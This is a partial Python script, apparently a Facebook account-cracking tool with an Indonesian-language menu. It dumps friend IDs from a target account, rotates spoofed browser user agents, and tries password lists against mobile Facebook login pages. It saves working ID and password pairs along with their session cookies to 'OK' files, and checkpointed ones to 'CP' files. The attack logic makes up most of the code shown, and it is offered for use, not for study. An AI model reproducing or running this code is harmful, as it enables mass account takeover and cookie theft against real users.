...
for apa in range(10000):
	...
	cih = str(rc([f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 OPR/100.0.0.0"]))
	cih1 = str(rc([f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 OPR/100.0.0.0"]))
	cih2 = str(rc([f"Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.36 OPR/63.3.3216.58675"]))
	cih3 = str(rc([f"Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.36 OPR/63.3.3216.58675"]))
	cih4 = str(rc([f"Mozilla/5.0 (Linux; Android 10; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.36 OPR/63.3.3216.58675"]))
	cih5 = str(rc([f"Opera/9.80 (Windows NT 6.1; WOW64; Opera/9.80 (S60; SymbOS; Opera Mobi/SYB-1204232258; U; ru) Presto/2.10.254 Version/12.00) Presto/2.12.388 Version/12.18"]))
	cih6 = str(rc([f"Opera/9.80 (Windows NT 5.1; Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.159 CoRom/33.0.1750.159 Safari/537.36 Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10"]))
	cih7 = str(rc([f"Opera/9.80 (Windows NT 5.1; Opera/9.80 (Windows NT 5.1; U; Opera/12.02 (Android 4.1; Linux; Opera Mobi/ADR-1111101157; U; en-US) Presto/2.9.201 Version/12.02; es-ES) Presto/2.10.229 Version/11.60) Presto/2.12.388 Version/12.18"]))
	cih8 = str(rc([f"Opera/9.80 (Windows NT 6.0; Opera/9.80 (Android 4.0.3; Linux; Opera Mobi/ADR-1309251116) Presto/2.11.355 Version/12.10) Presto/2.12.388 Version/12.17"]))
...
def banner():
	print('''\33[m
\x1b[1;91mUpdated : 20/july/2023
\x1b[1;91mWa Bang Firman : +628*******
\x1b[1;91mwa Bang NinjaXd : +628*****
\x1b[1;91mStatus : Private 
...
def menu(id):
	...
	#os.system("xdg-open https://wa.me/+6283170597744?text=Assalamualaikum+makasih+bang+sc+nya+moga+ijoðŸ™„")
	print(f'{xxx}[+]Crackers')
	helpbas = input(f'{xxx}[>>] : ')
	if helpbas in ['1']:
		nge_krek()
	else:
...
def nge_krek():
	try:
		...
		exit()
	print(f'{xxx}')
	idnyanih = input(f'[+]Idz Dump Target Crackers : ')
	try:
		...
		baz_anim(f'{mer}â””â”€â”€ koneksi terputus')
		exit()
	except (KeyError,IOError):
		baz_anim(f'{mer}â””â”€â”€ teman tidak publik')
		exit()
...
def atur_dulu():
	...
	print(f'[>>] 1. FACEBOOK AKUN [{h}OLD{x}]')
	print(f'[>>] 2. FACEBOOK AKUN [{h}NEW{x}]')
	print(f'[>>] 3. FACEBOOK AKUN  [{h}RANDOM{x}]')
	aturid = input(f'{xxx}[Pilih Menu] : ')
	if aturid in ['1','01']:
	...
	print(f'{h}1 m.fb{x}V1    {u}3 m.fb{x}A1  {b}4 m.fb{x}RE\n{h}2 m.fb{x}V2{xxx}')
	metod = input(f'{xxx}[>>] : ')
	if metod in ['1','01']:
		baz.append('free')
	elif metod in ['2','02']:
...
def crackfree(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r{h}V5 {idf}{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]')
	prog.advance(des)
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}[{m}CP{x}] {k}{idf}|{pw} >> {cektahun(idf)}{m}\n{ua}{N}')
				...
				print(f'\r{x}[{h}OK{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{u}{ua}{N}')
...
def crackmobile(idf,pwv):
	...
	global loop,ok,cp
	prog.update(des,description=f'\r{h}V5 MOBILE{idf}{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]')
	prog.advance(des)
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
...
def crackmobile1(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{m}\n{ua}{N}')
				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				...
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print(f'\r{x}[{b}OK{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{u}{ua}{N}')
				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kukis)
				break
